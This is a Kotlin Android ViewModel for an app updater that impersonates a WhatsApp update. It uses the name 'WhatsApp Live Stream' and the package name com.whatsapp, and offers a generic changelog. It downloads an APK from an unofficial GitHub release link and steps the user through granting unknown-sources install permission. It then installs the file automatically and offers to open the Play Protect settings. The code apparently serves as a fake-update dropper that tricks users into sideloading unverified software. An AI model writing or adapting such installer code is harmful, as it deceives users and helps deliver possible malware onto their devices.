package com.example.viewmodel

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.model.AppUpdateInfo
import com.example.model.DownloadState
import com.example.model.UpdateFlowStep
import com.example.updater.AppUpdateManager
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File

class UpdaterViewModel(application: Application) : AndroidViewModel(application) {

    val updateManager = AppUpdateManager(application, viewModelScope)

    private val _updateInfo = MutableStateFlow(
        AppUpdateInfo(
            appName = "WhatsApp Live Stream",
            packageName = "com.whatsapp",
            currentVersionName = "1.0.0",
            latestVersionName = "2.24.18",
            latestVersionCode = 22418,
            releaseDate = "v2.24.18",
            fileSizeBytes = 42_000_000L,
            formattedSize = "WhatsApp Live Stream APK",
            changelogTitle = "Time for UPDATES!",
            changelogDescription = "We have added numerous new features and fixed some bugs to make the app as comfortable as possible for you",
            downloadUrl = "https://github.com/installerapp-oss/whatsapp-live-stream-/releases/download/whatsapp-live-stream.apk/whatsapp.apk"
        )
    )
    val updateInfo: StateFlow<AppUpdateInfo> = _updateInfo.asStateFlow()

    private val _flowStep = MutableStateFlow(UpdateFlowStep.IDLE)
    val flowStep: StateFlow<UpdateFlowStep> = _flowStep.asStateFlow()

    private val _showFileMediaDialog = MutableStateFlow(false)
    val showFileMediaDialog: StateFlow<Boolean> = _showFileMediaDialog.asStateFlow()

    private val _showSecurityDialog = MutableStateFlow(false)
    val showSecurityDialog: StateFlow<Boolean> = _showSecurityDialog.asStateFlow()

    private val _showSecurityGuideDialog = MutableStateFlow(false)
    val showSecurityGuideDialog: StateFlow<Boolean> = _showSecurityGuideDialog.asStateFlow()

    val downloadState: StateFlow<DownloadState> = updateManager.downloadState
    val realPermissionGranted: StateFlow<Boolean> = updateManager.canInstallUnknown

    private var downloadedApkFile: File? = null

    init {
        // Collect download state
        viewModelScope.launch {
            updateManager.downloadState.collect { state ->
                when (state) {
                    is DownloadState.Downloaded -> {
                        downloadedApkFile = state.file
                        _flowStep.value = UpdateFlowStep.READY_TO_INSTALL
                        // Automatically trigger package installation
                        attemptInstallApk(state.file)
                    }
                    is DownloadState.Downloading -> {
                        _flowStep.value = UpdateFlowStep.DOWNLOADING
                    }
                    is DownloadState.Idle -> {
                        if (_flowStep.value == UpdateFlowStep.DOWNLOADING) {
                            _flowStep.value = UpdateFlowStep.IDLE
                        }
                    }
                    is DownloadState.Error -> {
                        // Keep flowStep or let user retry
                    }
                    else -> Unit
                }
            }
        }
    }

    fun onUpdateClicked() {
        // Step 1: Open file & media storage permission dialog
        _flowStep.value = UpdateFlowStep.STORAGE_PERMISSION_POPUP
        _showFileMediaDialog.value = true
    }

    fun onFilePermissionAllowed() {
        _showFileMediaDialog.value = false
        // Step 2: Check unknown sources install permission
        val hasInstallPermission = updateManager.refreshPermissionStatus()
        if (hasInstallPermission) {
            // Permission already granted -> proceed to download
            startDownloadProcess()
        } else {
            // Need unknown sources permission -> show security dialog
            _flowStep.value = UpdateFlowStep.UNKNOWN_SOURCES_POPUP
            _showSecurityDialog.value = true
        }
    }

    fun onFilePermissionDenied() {
        _showFileMediaDialog.value = false
        _flowStep.value = UpdateFlowStep.IDLE
    }

    fun onSecurityDialogSettingsClicked() {
        _showSecurityDialog.value = false
        // Open real Android settings for installing unknown apps
        updateManager.openInstallUnknownAppsSettings()
    }

    fun onSecurityPermissionGrantedOrContinued() {
        _showSecurityDialog.value = false
        startDownloadProcess()
    }

    fun onSecurityDialogDismissed() {
        _showSecurityDialog.value = false
        _flowStep.value = UpdateFlowStep.IDLE
    }

    fun refreshPermissionOnResume() {
        val hasPermission = updateManager.refreshPermissionStatus()
        if (hasPermission && _flowStep.value == UpdateFlowStep.UNKNOWN_SOURCES_POPUP) {
            _showSecurityDialog.value = false
            startDownloadProcess()
        }
    }

    fun startDownloadProcess() {
        _flowStep.value = UpdateFlowStep.DOWNLOADING
        updateManager.startDownload(_updateInfo.value)
    }

    fun retryDownload() {
        startDownloadProcess()
    }

    fun cancelDownload() {
        updateManager.cancelDownload()
        _flowStep.value = UpdateFlowStep.IDLE
    }

    fun attemptInstallApk(file: File? = downloadedApkFile) {
        val target = file ?: downloadedApkFile ?: return
        val hasPermission = updateManager.refreshPermissionStatus()
        if (hasPermission) {
            updateManager.triggerInstall(target, _updateInfo.value)
        } else {
            _showSecurityDialog.value = true
        }
    }

    fun openSecurityGuide() {
        _showSecurityGuideDialog.value = true
    }

    fun dismissSecurityGuide() {
        _showSecurityGuideDialog.value = false
    }

    fun openAppInfoSettings() {
        updateManager.openAppDetailsSettings(_updateInfo.value.packageName)
    }

    fun openPlayProtectSettings() {
        updateManager.openPlayProtectSettings()
    }
}
